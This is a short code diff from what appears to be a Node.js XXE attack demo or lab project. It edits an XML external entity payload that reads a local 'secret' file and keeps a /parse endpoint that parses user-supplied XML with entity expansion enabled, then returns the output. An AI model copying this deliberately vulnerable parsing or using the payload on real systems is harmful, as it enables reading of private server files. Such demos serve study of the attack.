@@ -32,7 +32,7 @@ app.get('/target_client.js', function(req,res){
  '<pass>mypass</pass>' +
  '</creds>'
 
- <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "/home/spencer/security/XMLEE/secret" >]><creds><user>&xxe;</user><pass>mypass</pass></creds>
+ <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "/home/spencer/JavascriptAttacks/XMLEE/secret" >]><creds><user>&xxe;</user><pass>mypass</pass></creds>
 
 
  var doc = libxml.parseXml(xmlsrc, { noent: true });
@@ -47,7 +47,6 @@ app.get('/target_client.js', function(req,res){
 app.post('/parse', function (req,res) {
     console.log(req.body.input);
     var xmlsrc = req.body.input;
-    var xmlsrc = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "/home/spencer/security/XMLEE/secret" >]><creds><user>&xxe;</user><pass>mypass</pass></creds>';
     var doc = libxml.parseXmlString(xmlsrc, { noent: true });
     console.log(doc.toString());
     res.send(doc.toString());
